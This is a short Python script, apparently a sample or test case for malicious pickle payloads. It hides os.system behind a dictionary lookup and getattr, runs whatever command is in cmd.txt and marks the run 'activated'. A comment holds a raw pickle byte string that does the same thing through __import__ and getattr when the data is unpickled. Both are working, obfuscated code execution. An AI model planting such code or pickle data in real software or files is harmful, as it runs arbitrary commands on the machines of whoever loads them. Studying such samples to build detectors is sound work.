import os
import sys

registry = {"ops": {"rce": "system"}}
path = "cmd.txt"

getattr(os, registry["ops"]["rce"])(open(path).read())

results = {"history": {}}
results["history"][sys.platform] = "activated"
# b'(Vops\n(Vrce\nVsystem\nddp0\nVcmd.txt\np1\ng3\n(cbuiltins\n__import__\np4\n(Vos\ntRp5\ng3\n(g3\n(g0\nV__getitem__\ntR(Vops\ntRV__getitem__\ntR(Vrce\ntRtR(cbuiltins\ngetattr\np3\n(cbuiltins\nopen\np2\n(g1\ntRVread\ntR(tRtR(Vhistory\n(ddp6\ncsys\nplatform\np7\ng3\n(g6\nV__getitem__\ntR(Vhistory\ntR(g7\nVactivated\nu.'
